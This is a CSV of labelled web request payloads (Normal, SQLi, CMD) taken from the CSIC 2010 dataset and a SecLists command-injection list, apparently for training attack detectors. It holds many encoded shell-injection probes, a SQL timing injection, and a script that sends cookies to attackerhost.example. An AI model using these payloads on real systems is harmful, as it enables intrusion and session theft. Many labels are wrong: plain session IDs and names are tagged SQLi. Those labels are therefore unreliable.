payload,label,source
modo=entrar&login=roderick&pwd=in5rover88&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
%7C%20%5B%205%20-ne%20%24%28echo%20HHUNZT%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
6E0DF3BAE02CE564C28F66379AB065D8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
bayola,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26echo%20TBCUEY$((8%2B42))$(echo%20TBCUEY)TBCUEY&,CMD,seclists_cmd
ada,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
103204DD41F44DB83B7AC44E9110DB63,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1C784159EC98812FF96D92DE0D29053E,Normal,csic_gsi:cisc_normalTraffic_train.txt
Josu,Normal,csic_gsi:cisc_normalTraffic_test.txt
persechi0,Normal,csic_gsi:cisc_normalTraffic_test.txt
0707AEE6F0DE4377C23AD55AE8D4A4E4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%3B%20str%3D%24%28echo%20ZWBBRM%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
'%7C%7Cecho$IFSBZCSNS$((71%2B69))$(echo$IFSBZCSNS)BZCSNS\,CMD,seclists_cmd
carmichael@lamasguapa.az,Normal,csic_gsi:cisc_normalTraffic_test.txt
%22%26%20sleep%200%20%26%26%20str%3D%24%28echo%20ENIIMV%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%207%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%23,CMD,seclists_cmd
id=2&nombre=Vino+Rioja&precio=85&cantidad=19&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
27040ED381F9C4D6B997B06CF878AD58,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=insertar&precio=7016&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
;echo%20KSVCNW$((0%2B53))$(echo%20KSVCNW)KSVCNW,CMD,seclists_cmd
Marceni�o,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
84881293T,Normal,csic_gsi:cisc_normalTraffic_train.txt
141435D467578A58080054FF85B93D0D,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
28039E4908EC9E5194ECA7A76392D0E2,Normal,csic_gsi:cisc_normalTraffic_train.txt
Duocastella,Normal,csic_gsi:cisc_normalTraffic_test.txt
0C0E6F42EDE60004A97CBD6D1A2C0D35,Normal,csic_gsi:cisc_normalTraffic_train.txt
&&echo$IFSVGHYXY$((50%2B76))$(echo$IFSVGHYXY)VGHYXY&,CMD,seclists_cmd
FD3887764391FE810F0594AC8CF132EE,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Lilen,Normal,csic_gsi:cisc_normalTraffic_test.txt
55A26647A9AD372D86434921931AEE33,Normal,csic_gsi:cisc_normalTraffic_train.txt
efdal,Normal,csic_gsi:cisc_normalTraffic_test.txt
dommety,Normal,csic_gsi:cisc_normalTraffic_test.txt
D603786BB32313DCF8003FB01BDCD055,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4662EED638F0423473D9EBD438A9D1EB,Normal,csic_gsi:cisc_normalTraffic_test.txt
C19E33C1F52333E4F97F53CC30C8FBFA,Normal,csic_gsi:cisc_normalTraffic_test.txt
);}print(`echo%20KBRMCR\necho%20$((41%2B94))\necho%20KBRMCR\necho%20KBRMCR`)%3B.%25252527KBRMCR,CMD,seclists_cmd
2949,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
'|echo$IFSBTCBHW$((54%2B8))$(echo$IFSBTCBHW)BTCBHW,CMD,seclists_cmd
"modo=registro&login=stevan&password=d95E8t8R&nombre=Clementino&apellidos=Cuquerel&email=woodthorpe_bilbao@davidymamen.kz&dni=94942937H&direccion=C/+Montenegro,+S/N+1-F&ciudad=Valverde+del+Camino&cp=42107&provincia=Tarragona&ntc=6752111572141626&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
errorMsg=Credenciales+incorrectassessionid=12312312&+username=%3C%73%63%72%69%70%74%3E%64%6F%63%75%6D%65%6E%74%2E%6C%6F%63%61%74%69%6F%6E%3D%27%68%74%74%70%3A%2F%2F%61%74%74%61%63%6B%65%72%68%6F%73%74%2E%65%78%61%6D%70%6C%65%2F%63%67%69%2D%62%69%6E%2F%63%6F%6F%6B%69%65%73%74%65%61%6C%2E%63%67%69%3F%27%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%3C%2F%73+%63%72%69%70%74%3E?,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
03B63F0A94009CE6895B863BF4DDEB23,Normal,csic_gsi:cisc_normalTraffic_test.txt
8898020239162472,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Graziana,Normal,csic_gsi:cisc_normalTraffic_train.txt
garito,Normal,csic_gsi:cisc_normalTraffic_test.txt
822280D1E3298232C4809E2A93CBC995,Normal,csic_gsi:cisc_normalTraffic_test.txt
10230,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F46D065F16A651AE74ECD22F778FA6BB,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6040888757825695,Normal,csic_gsi:cisc_normalTraffic_train.txt
950C8DEBDEF8C8993E5DA6BDFC055B3A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%2522%3B%20str%3D%24%28echo%20BBUDLO%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%252F%252F,CMD,seclists_cmd
6436,Normal,csic_gsi:cisc_normalTraffic_test.txt
A8E2BD94AA804AB20A959D25AF9A11F4,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6717597FC73B21E84BD5FEE56F414FEE,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=','0','0');waitfor+delay+'0:0:15';--&precio=2158&B1=Pasar+por+caja",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
edgar,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=insertar&precio=3042&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_test.txt
2FB4CF0C5F46313229369B6882E9F21D,Normal,csic_gsi:cisc_normalTraffic_test.txt
Basset+Ramos,Normal,csic_gsi:cisc_normalTraffic_train.txt
24B7B811C58798F4F306671FEB8A03D6,Normal,csic_gsi:cisc_normalTraffic_train.txt
B38741F0C1C113CBB2CDF33D234269BE,Normal,csic_gsi:cisc_normalTraffic_test.txt
baylor@magichobby.sy,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D732115455E62B0B6C38B2013CCECFCB,Normal,csic_gsi:cisc_normalTraffic_train.txt
modo=entrar&login=olav&pwd=c7em&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27%0A%20str%3D%24%28echo%20FXCZOR%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%208%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2526,CMD,seclists_cmd
D78174545BDD48C84F7FB310EFFE3C92,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Arcones,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E2070AF552308EC365F5F819C5147F09,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
modo=insertar&precio=8629&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
B1BE13BC07AC27C9930B3A0FCB0263F7,Normal,csic_gsi:cisc_normalTraffic_train.txt
B2FA22EBB0F3BACBDA4A1A3016239B80,Normal,csic_gsi:cisc_normalTraffic_test.txt
dubreck,Normal,csic_gsi:cisc_normalTraffic_test.txt
AA5DC17402916830C77D949F7758F35C,Normal,csic_gsi:cisc_normalTraffic_test.txt
%2522%7C%20%5B%206%20-ne%20%24%28echo%20JUHLQP%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20,CMD,seclists_cmd
26372,Normal,csic_gsi:cisc_normalTraffic_test.txt
6169270584542150,Normal,csic_gsi:cisc_normalTraffic_test.txt
A0E035BAF9763CF18D84C1EF4A842A77,Normal,csic_gsi:cisc_normalTraffic_train.txt
14F82944EB1A5C5C2C77B72257631569,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%27%7C%20%5B%209%20-ne%20%24%28echo%20QPTCDE%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2527,CMD,seclists_cmd
F38ABAD764A9E2A20E8BB45ED545CCCA,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%20echo%20JMDNRV$((22%2B54))$(echo%20JMDNRV)JMDNRV%22,CMD,seclists_cmd
C77A87F35BF2001FDAB7FFB544DDEE2F,Normal,csic_gsi:cisc_normalTraffic_test.txt
reSPALdar,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=3&nombre=Vino+Rioja&precio=39&cantidad=39&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%7Cecho$IFSEXCORO$((79%2B26))$(echo$IFSEXCORO)EXCORO%7C,SQLi,community:payloads_seed
modo=entrar&loginA=cooney&pwd=music�8an0&remember=on&B1=Entrar,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F8E292ACF65EECA560492476E7DC7DBC,Normal,csic_gsi:cisc_normalTraffic_train.txt
tecNo6�g5ca,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
550C1575E0D1628DF05E92B9B0D5DB6A,Normal,csic_gsi:cisc_normalTraffic_test.txt
1930717762858369,Normal,csic_gsi:cisc_normalTraffic_test.txt
%7C%20%5B%202%20-ne%20%24%28echo%20PENGWJ%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%2526,CMD,seclists_cmd
modo=insertar&precio=4051&B1=Pasar+por+caja,Normal,csic_gsi:cisc_normalTraffic_train.txt
5CD40FD2DF8D24D148F683A03757229E,Normal,csic_gsi:cisc_normalTraffic_test.txt
modo=entrar&login=kuofeng&pwd=enmendable&remember=on&B1=Entrar,Normal,csic_gsi:cisc_normalTraffic_test.txt
||echo$IFSOXMDCJ$((76%2B31))$(echo$IFSOXMDCJ)OXMDCJ%22,CMD,seclists_cmd
Bicelis+Calder�n,Normal,csic_gsi:cisc_normalTraffic_train.txt
&echo%20MYJSKQ$((23%2B79))$(echo%20MYJSKQ)MYJSKQ',CMD,seclists_cmd
63C4CCDDACADC7BAA1BB23C24A941F81,Normal,csic_gsi:cisc_normalTraffic_test.txt
97610819S,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
CAB86E48D2930AE00ECB41E7BE2CBC87,Normal,csic_gsi:cisc_normalTraffic_test.txt
712238ED6244E216AC0B7AE3A2961C17,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4222BF5E97F7A39800573D881D1017A7,Normal,csic_gsi:cisc_normalTraffic_test.txt
8157F861B55A9B478151735C3970128E,Normal,csic_gsi:cisc_normalTraffic_test.txt
92F24E70D07F65665B95E231D63AA800,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Inara,Normal,csic_gsi:cisc_normalTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20CJCSGG%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%204%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%26,CMD,seclists_cmd
%3B%20str%3D%24%28echo%20QIIKMD%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%257C,CMD,seclists_cmd
9CB9C371C9206F1A7DAAD029EC7B10DB,Normal,csic_gsi:cisc_normalTraffic_test.txt
Atos,Normal,csic_gsi:cisc_normalTraffic_train.txt
CE5CA6346CA162B3FD19E40E0A202759,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
DDD750BC64C52ADC2692ACFA0741D5DF,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Ribas+i+Perdigo+50+,Normal,csic_gsi:cisc_normalTraffic_test.txt
F8486CB9490E7A2A81638017E744CE5B,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
2A170E36C2E7C7EE2A40145D2CEFD6B0,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20FWGGRQ%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%2522,CMD,seclists_cmd
%22%7C%20%5B%205%20-ne%20%24%28echo%20XWWMIW%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%23,CMD,seclists_cmd
%27%26%26echo$IFSFYRIYE$((49%2B44))$(echo$IFSFYRIYE)FYRIYE|,CMD,seclists_cmd
9E3762B7DE930373ED82DFC93CD03A4F,Normal,csic_gsi:cisc_normalTraffic_test.txt
7D36C2E951AE5841389358289B32D5A4,Normal,csic_gsi:cisc_normalTraffic_train.txt
7D954A575354D9DCE2F6B568D6F890CF,Normal,csic_gsi:cisc_normalTraffic_train.txt
macgowan@comerciosdeaspe.kr,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
83F63805D5AA574E6315A38D741A01B0,Normal,csic_gsi:cisc_normalTraffic_test.txt
ACB887AA2C9B85BF990952BBDAA2DC89,Normal,csic_gsi:cisc_normalTraffic_train.txt
%00,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
E9AC62DDE1F9E74CC6A0E0EFF2B3986F,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
9BAD3889D96143FAC3C1705ABBC640A2,Normal,csic_gsi:cisc_normalTraffic_test.txt
58D10B5067C16A477A5757037CA7E398,Normal,csic_gsi:cisc_normalTraffic_train.txt
87821D57AA0F3A11A52F4518171A75B3,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20IKKWEG%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%204%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%23,CMD,seclists_cmd
"modo=registro&login=schyndel&password=trufaldina&nombre=Yadia&apellidos=Puerta+Garreta&email=fleur@drae2.kh&dni=52864416C&direccion=Parque+De+Despe�aperros,+159+&ciudad=Algerri&cp=47175&provincia=Zaragoza&ntc=9535422521832781&B1=%7C",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%7C%20%5B%209%20-ne%20%24%28echo%20CSMWFN%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%7C,CMD,seclists_cmd
fadden@g-audio.us,Normal,csic_gsi:cisc_normalTraffic_test.txt
7C84A8E712C8977847A50C44267C0028,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
18BD3FEE40EC25B6DA49D65FA66ACBE5,Normal,csic_gsi:cisc_normalTraffic_test.txt
8348395638560525,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
89S0R56Gl8,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
8F7C7645FD712B1911ABCE38640D248C,Normal,csic_gsi:cisc_normalTraffic_train.txt
C41E2257F775815ED80523D8B675268F,Normal,csic_gsi:cisc_normalTraffic_train.txt
1ECC462CFAFEDDB54490D2B532A5B94F,Normal,csic_gsi:cisc_normalTraffic_train.txt
id=1&nombre=Queso+Manchego&precio=100&cantidad=60&B1=A�adir+al+carrito,Normal,csic_gsi:cisc_normalTraffic_test.txt
id=2/&nombre=Queso+Manchego&precio=100&cantidad=48&B1=A�adir+al+carrito,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
4702,Normal,csic_gsi:cisc_normalTraffic_train.txt
2840005774765443,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bienvenido,Normal,csic_gsi:cisc_normalTraffic_train.txt
"""%3Becho%20PDMNTI$((23%2B51))$(echo%20PDMNTI)PDMNTI",CMD,seclists_cmd
91FC6CBBF2BAE9A9F743A0715996C94F,Normal,csic_gsi:cisc_normalTraffic_train.txt
CB46C954C7CF5DD17E35A6C0CC90B9C4,Normal,csic_gsi:cisc_normalTraffic_test.txt
8F6FAC18337BDCA144358DB2721575F8,Normal,csic_gsi:cisc_normalTraffic_test.txt
butarinski_sawyer@proofreader.fj,Normal,csic_gsi:cisc_normalTraffic_train.txt
mcduffie,Normal,csic_gsi:cisc_normalTraffic_train.txt
A6627D806ADD7A5602D73F6F31E028C2,Normal,csic_gsi:cisc_normalTraffic_test.txt
Villameriel,Normal,csic_gsi:cisc_normalTraffic_test.txt
%0A%20str%3D%24%28echo%20TIKHVB%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%257C,CMD,seclists_cmd
"Rio+Adra,+81,+",Normal,csic_gsi:cisc_normalTraffic_test.txt
EB0247BB17A666B1C4052FAFA56F5179,Normal,csic_gsi:cisc_normalTraffic_train.txt
Jidit,Normal,csic_gsi:cisc_normalTraffic_test.txt
445719111DF6C42A3807A4B5698BDAA9,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=lonidas&password=FUNDaMEntaLmENtE&nombre=Felipa&apellidos=Ju�rez&email=sarcey-fendel@gesmahernan.de&dni=98918059G&direccion=Calle+Cosidores,+S/N,+&ciudad=Capileira&cp=47690&provincia=Navarra&ntc=6160253696929665&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
su5a,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
60D8B32FDC11AFA8CE62FA06731EC69F,Normal,csic_gsi:cisc_normalTraffic_train.txt
96EACAEA9B11DF97A4433DA6FCAD0D43,Normal,csic_gsi:cisc_normalTraffic_train.txt
7AC3631721062EA582EF5CEF2F0A2911,Normal,csic_gsi:cisc_normalTraffic_test.txt
1F155B2FF64C258F39FD3C78646557A2,Normal,csic_gsi:cisc_normalTraffic_test.txt
1D7C95B2FA2735BD722AF65670DFAB8F,Normal,csic_gsi:cisc_normalTraffic_train.txt
%27;echo%20HPMAEK$((9%2B6))$(echo%20HPMAEK)HPMAEK\,CMD,seclists_cmd
2C6256CA9296E514A844F73A689D61EB,Normal,csic_gsi:cisc_normalTraffic_train.txt
771,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=piggott&password=1ojE61&nombre=Quinto&apellidos=Ossand�n&email=beresford@juanpolo.ba&dni=26612230B&direccion=Pla�a+Joan+Gasso,+S/N,+9B&ciudad=Avinyonet+de+Puigvent�s&cp=42150&provincia=Guadalajara&ntc=3509344027526428&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_test.txt
77EE75C06C8C7CD5BE6233F15AC25588,Normal,csic_gsi:cisc_normalTraffic_train.txt
"Calle+Incas,+159,+5?A",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
ADB13AA8C779780FD7F10EC4AE80A5DD,Normal,csic_gsi:cisc_normalTraffic_train.txt
CC74B1C0D615D7E8BB203162F5732D0F,Normal,csic_gsi:cisc_normalTraffic_train.txt
Bagot+Alzogaray,Normal,csic_gsi:cisc_normalTraffic_train.txt
1F3F48F432D8EEF8E80504D3BF0D41FB,Normal,csic_gsi:cisc_normalTraffic_test.txt
0065398917F483D2838DF1936DD0DEA5,Normal,csic_gsi:cisc_normalTraffic_train.txt
Fargas+Tranmar,Normal,csic_gsi:cisc_normalTraffic_test.txt
099F568E3106EF89177447C375DA063C,Normal,csic_gsi:cisc_normalTraffic_test.txt
BD1D13579AAEC89E460E62933F3FDCB6,Normal,csic_gsi:cisc_normalTraffic_test.txt
F7F03DB9FE3039D2D33DE0E2D13A1CC2,Normal,csic_gsi:cisc_normalTraffic_train.txt
Ladislada,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
F8785C955067B91D6073CD45630E87DC,Normal,csic_gsi:cisc_normalTraffic_train.txt
marieau8@clementelr.nz,Normal,csic_gsi:cisc_normalTraffic_train.txt
7177,Normal,csic_gsi:cisc_normalTraffic_test.txt
%3B%20str%3D%24%28echo%20GFXUIS%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%205%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%23,CMD,seclists_cmd
5318CA6A38C811E4A4E29B31F903716A,Normal,csic_gsi:cisc_normalTraffic_train.txt
CD3FFB57C016A68BA88EF2FCF79EE7B9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
79895D77C86C6FF19EBBC97255A3B59F,SQLi,community:payloads_seed
escarnidor,Normal,csic_gsi:cisc_normalTraffic_test.txt
petretta,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
1CE31EEB9D007DE6D7DEE805C55B37A1,Normal,csic_gsi:cisc_normalTraffic_test.txt
7CF1A55714501B0F12399E6456C2983B,Normal,csic_gsi:cisc_normalTraffic_test.txt
potajera,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D11381968C5343DBDDD7B9619A16A620,Normal,csic_gsi:cisc_normalTraffic_test.txt
Cueva+del+Hierro,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
112E9C4CB2F307252C863EA740DA2197,Normal,csic_gsi:cisc_normalTraffic_test.txt
"modo=registro&login=fadhel&password=canaler3&nombre=Damasio&apellidos=Guito+Mat�&email=stribling.bettin@bru�oseguridad.ye&dni=58753714F&direccion=Et+orbidea+*Galizia,+120+&ciudad=Tubilla+del+Agua&cp=16340&provincia=Toledo&ntc=4927358900726396&B1=Registrar",SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
3706A5EF197C662051528DBF9F4666C4,Normal,csic_gsi:cisc_normalTraffic_train.txt
%26echo%20OXZPGU$((40%2B61))$(echo%20OXZPGU)OXZPGU%2F%2F,CMD,seclists_cmd
C/+Guardia+Civil+181+10?E,SQLi,community:payloads_seed
330E43E1414BAE81DE4A3840482E129A,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
296E7A3AD71E00AE7E0F62D8DA05A045,Normal,csic_gsi:cisc_normalTraffic_test.txt
8DA412471FC4CD6262378C448B988D8C,Normal,csic_gsi:cisc_normalTraffic_train.txt
37874,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
Benicasim/Benic�ssim,Normal,csic_gsi:cisc_normalTraffic_test.txt
16842,Normal,csic_gsi:cisc_normalTraffic_train.txt
Delfo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26%20sleep%200%20%26%26%20str%3D%24%28echo%20SZMRAM%29%20%26%26%20str1%3D%24%7B%23str%7D%20%26%26%20%5B%201%20-eq%20%24%7Bstr1%7D%20%5D%20%26%26%20sleep%201%20%5C%5C,CMD,seclists_cmd
Mar�a+Begonia,Normal,csic_gsi:cisc_normalTraffic_test.txt
burrud-gyoengyoessy@carloshoya.com.pr,Normal,csic_gsi:cisc_normalTraffic_train.txt
20D16DD42F906AA4C8F31A4B2E7420C9,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
899024971E3F7D9445823E99AF94906C,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
D610B19626DD7863B44053C538FAA0B2,Normal,csic_gsi:cisc_normalTraffic_train.txt
F0BB142CAA97C856DB6D8119F372AA34,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
"modo=registro&login=schulz&password=arRE&nombre=Haroldo&apellidos=Paquet+Bisbal&email=wakao@sitienesunawebtienesunnegocio.as&dni=61882626E&direccion=Calle+Bullaque,+46+10-F&ciudad=Llanes&cp=48552&provincia=Soria&ntc=1084102116286517&B1=Registrar",Normal,csic_gsi:cisc_normalTraffic_train.txt
skeuse,Normal,csic_gsi:cisc_normalTraffic_test.txt
C5D713F27453C9F66B890445264FF18C,Normal,csic_gsi:cisc_normalTraffic_test.txt
C9EF5ABBD91D053901B7C0F4972E1A3F,Normal,csic_gsi:cisc_normalTraffic_train.txt
50369,Normal,csic_gsi:cisc_normalTraffic_test.txt
3494597071939673,Normal,csic_gsi:cisc_normalTraffic_test.txt
trivedi9,Normal,csic_gsi:cisc_normalTraffic_test.txt
2C7A18416F1143A23DF5D7C6748CD9FD,Normal,csic_gsi:cisc_normalTraffic_test.txt
E2EFC34DD331FD3EE02F1A0B777B7A1F,Normal,csic_gsi:cisc_normalTraffic_test.txt
EF307657491430EB6C063204EA352C34,Normal,csic_gsi:cisc_normalTraffic_test.txt
harm�nica,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%3B%20str%3D%24%28echo%20GJYXKU%29%3B%20str1%3D%24%7B%23str%7D%3B%20if%20%5B%207%20-ne%20%24%7Bstr1%7D%20%5D%3B%20then%20sleep%200%3B%20else%20sleep%201%3B%20fi%20%2526,CMD,seclists_cmd
'.print(`echo%20QLKXYP;echo%20$((79%2B46));echo%20QLKXYP;echo%20QLKXYP`)%3B%255C%255CQLKXYP,CMD,seclists_cmd
hesseman.dolen@gaudio.mu,Normal,csic_gsi:cisc_normalTraffic_train.txt
4BCFBD64A737B4CE484AF819C1E15C03,Normal,csic_gsi:cisc_normalTraffic_train.txt
1C51029EEA1CA2F75B58E3F727A4FEBE,Normal,csic_gsi:cisc_normalTraffic_test.txt
18614,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
69FDBD954C2CE97671F698DC328DB871,Normal,csic_gsi:cisc_normalTraffic_test.txt
Valor+Agudo,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
6467099706129021,Normal,csic_gsi:cisc_normalTraffic_train.txt
""");}print(`echo%20CKSIUK\necho%20$((45%2B4))\necho%20CKSIUK\necho%20CKSIUK`)%3B%25252523CKSIUK",CMD,seclists_cmd
Lecuona+Gasull,Normal,csic_gsi:cisc_normalTraffic_train.txt
9CDB1AF9786DDBD0EAB5DEDE5896E880,Normal,csic_gsi:cisc_normalTraffic_train.txt
163CE4A27E0E15DDECECEE4AA75E5845,SQLi,csic_gsi:cisc_anomalousTraffic_test.txt
%26echo%20MHEMLM$((72%2B41))$(echo%20MHEMLM)MHEMLM%7C,CMD,seclists_cmd
07F9B2660F77995A8D89B55DF753DFD1,Normal,csic_gsi:cisc_normalTraffic_train.txt
%2522%7C%20%5B%208%20-ne%20%24%28echo%20XHMATL%20%7C%20tr%20-d%20%27%5Cn%27%20%7C%20wc%20-c%29%20%5D%20%7C%7C%20sleep%201%20%22,CMD,seclists_cmd
23BB7B716D2CC98EB2C5776A065811C4,Normal,csic_gsi:cisc_normalTraffic_train.txt
%0A%20str%3D%24%28echo%20NFRBHV%29%0A%20str1%3D%24%7B%23str%7D%0A%20if%20%5B%209%20-ne%20%24%7Bstr1%7D%20%5D%0A%20then%20sleep%200%0A%20else%20sleep%201%0A%20fi%20%27,CMD,seclists_cmd
C64B225475FC2385347CD471CCE9E4BB,Normal,csic_gsi:cisc_normalTraffic_test.txt
E04BFB9E4D7EF6C0F32E1FB7B7F4B1E6,Normal,csic_gsi:cisc_normalTraffic_test.txt
2F0526C2CC679BCC9EC5ABF8DCF8766B,Normal,csic_gsi:cisc_normalTraffic_train.txt
